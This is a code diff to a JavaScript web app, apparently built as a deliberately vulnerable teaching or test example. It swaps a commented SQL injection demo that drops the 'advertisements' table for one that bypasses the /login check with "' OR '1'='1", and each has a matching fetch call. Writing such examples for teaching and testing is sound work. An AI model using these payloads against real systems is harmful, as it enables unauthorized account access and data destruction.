@@ -50,15 +50,18 @@ app.post("/login", (req, res) => {
 });
 
 /* -----------------------------------------------------------------------------
-SQL Injection Impact Exploit Example:
-- An attacker can exploit the SQL injection vulnerability in the /search-advertisements endpoint
+SQL Injection Exploit Example:
+- An attacker can exploit the SQL injection vulnerability in the /login endpoint
 - by crafting a malicious input that alters the SQL query logic.
-- Example: By setting the query parameter to "'; DROP TABLE advertisements; --", the attacker can terminate the original query and execute a destructive command.
+- Example: By setting the email parameter to "' OR '1'='1" and any password,
+- the resulting SQL query becomes:
+  SELECT * FROM users WHERE email = '' OR '1'='1' AND password = 'hashedPassword'
 -----------------------------------------------------------------------------*/
-fetch("/search-advertisements", {
-  method: "GET",
+fetch("/login", {
+  method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({
-    query: "'; DROP TABLE advertisements; --",
+    email: "' OR '1'='1",
+    password: "password123",
   }),
 });
